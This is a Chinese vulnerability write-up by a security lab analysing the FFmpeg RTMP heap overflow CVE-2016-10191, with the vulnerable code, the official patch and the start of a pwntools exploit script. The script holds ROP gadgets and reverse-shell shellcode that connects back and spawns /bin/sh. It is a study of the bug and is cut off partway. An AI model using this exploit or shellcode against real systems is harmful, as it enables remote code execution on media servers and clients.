**作者：栈长@蚂蚁金服巴斯光年安全实验室**
* * *
## **一、前言**
FFmpeg是一个著名的处理音视频的开源项目，使用者众多。2016年末paulcher发现FFmpeg三个堆溢出漏洞分别为CVE-2016-10190、CVE-2016-10191以及CVE-2016-10192。网上对CVE-2016-10190已经有了很多分析文章，但是CVE-2016-10191尚未有其他人分析过。本文详细分析了CVE-2016-10191，是学习漏洞挖掘以及利用的一个非常不错的案例。
## **二、漏洞成因分析**
在 RTMP协议中，最小的发送数据包的单位是一个 chunk。客户端和服务器会互相协商好发送给对方的 chunk 的最大大小，初始为 0x80 个字节。一个
RTMP Message 如果超出了Max chunk size, 就需要被拆分成多个 chunk 来发送。在 chunk 的 header 中会带有
Chunk Stream ID 字段（后面简称 CSID），用于对等端在收到 chunk 的时候重新组装成一个 Message，相同的CSID 的
chunk 是属于同一个 Message 的。
在每一个 Chunk 的 Message Header 部分都会有一个 Size 字段存储该 chunk 所属的 Message 的大小，按道理如果是同一个
Message 的 chunk 的话，那么 size 字段都应该是相同的。这次漏洞的起因是对于属于同一个 Message 的 Chunk的 size
字段没有校验前后是否一致，导致写入堆的时候缓冲区溢出。
漏洞发生在rtmppkt.c文件中的rtmp_packet_read_one_chunk函数中，漏洞相关部分的源代码如下
    ​    size = size - p->offset;    //size 为 chunk 中提取的 size 字段
    ​    //没有检查前后 size 是否一致
    toread = FFMIN(size, chunk_size);//控制toread的值
    if (ffurl_read_complete(h, p->data + p->offset, toread) != toread) {
    ff_rtmp_packet_destroy(p);
    return AVERROR(EIO);
    ​    }
在 max chunk size 为0x80的前提下，如果前一个 chunk 的 size 为一个比较下的数值，如0xa0，而后一个 chunk 的
size 为一个非常大的数值，如0x2000, 那么程序会分配一个0xa0大小的缓冲区用来存储整个
Message，第一次调用ffurlreadcomplete函数会读取0x80个字节，放到缓冲区中，而第二次调用的时候也是读取0x80个字节，这就造成了缓冲区的溢出。
## **官方修补方案**
非常简单，只要加入对前后两个 chunk 的 size 大小是否一致的判断就行了，如果不一致的话就报错，并且直接把前一个 chunk 给销毁掉。
    +    if (prev_pkt[channel_id].read && size != prev_pkt[channel_id].size) {
     +        av_log(NULL, AV_LOG_ERROR, "RTMP packet size mismatch %d != %d\n",
     +                size,
     +                prev_pkt[channel_id].size);
     +        ff_rtmp_packet_destroy(&prev_pkt[channel_id]);
     +        prev_pkt[channel_id].read = 0;
    +    }
     +
## **三、漏洞利用环境的搭建**
漏洞利用的靶机环境
操作系统：Ubuntu 16.04 x64
FFmpeg版本：3.2.1
(参照
encoder编译进去。）
官方的编译过程由于很多都是静态编译，在一定程度上降低了利用难度。
## **四、漏洞利用脚本的编写**
首先要确定大致的利用思路，由于是堆溢出，而且是任意多个字节的，所以第一步是观察一下堆上有什么比较有趣的数据结构可以覆盖。堆上主要有一个RTMPPacket结构体的数组，每一个RTMPPakcet就对应一个
RTMP Message，RTMPPacket的结构体定义是这样的：
    /**
     * structure for holding RTMP packets
     */
    typedefstructRTMPPacket {
    intchannel_id; ///
    #!/usr/bin/python
    #coding=utf-8
    importos
    import socket
    importstruct
    from time import sleep
    frompwn import *
    bind_ip = '0.0.0.0'
    bind_port = 12345
    elf = ELF('/home/dddong/bin/ffmpeg')
    gadget = lambda x: next(elf.search(asm(x, arch = 'amd64', os = 'linux')))
    \# Gadgets that we need to know inside binary
    \# to successfully exploit it remotely
    add_esp_f8 = 0x00000000006719e3
    pop_rdi = gadget('pop rdi; ret')
    pop_rsi = gadget('pop rsi; ret')
    pop_rdx = gadget('pop rdx; ret')
    pop_rax = gadget('pop rax; ret')
    mov_rsp_rax = gadget('movrsp, rax; ret')
    mov_gadget = gadget('mov qword ptr [rax], rsi ; ret')
    got_realloc = elf.got['realloc']
    log.info("got_reallocaddr:%#x" % got_realloc)
    plt_mprotect = elf.plt['mprotect']
    log.info("plt_mprotectaddr:%#x" % plt_mprotect)
    shellcode_location = 0x400000
    \# backconnect 127.0.0.1:31337 x86_64 shellcode
    shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x7f\x00\x00\x01\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";
    shellcode = '\x90' * (8 - (len(shellcode) % 8)) + shellcode #8字节对齐
    defcreate_payload(size, data, channel_id):
    ​    """